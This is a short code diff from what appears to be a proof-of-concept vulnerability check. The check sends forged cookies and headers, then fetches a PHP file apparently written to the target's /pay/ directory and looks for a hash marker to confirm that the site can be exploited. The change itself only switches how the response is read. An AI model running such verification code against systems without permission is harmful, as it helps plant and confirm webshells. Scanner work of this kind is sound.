@@ -81,7 +81,7 @@ class Poc(ABPoc):
             verify_req = requests.get(
                 verify_url, cookies=false_cookies, headers=false_headers)
             verify_shell_url = '%s/pay/%d.php' % (self.target, filenum)
-            if '202cb962ac59075b964b07152d234b70' in requests.get(verify_shell_url).content:
+            if '202cb962ac59075b964b07152d234b70' in requests.get(verify_shell_url).text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
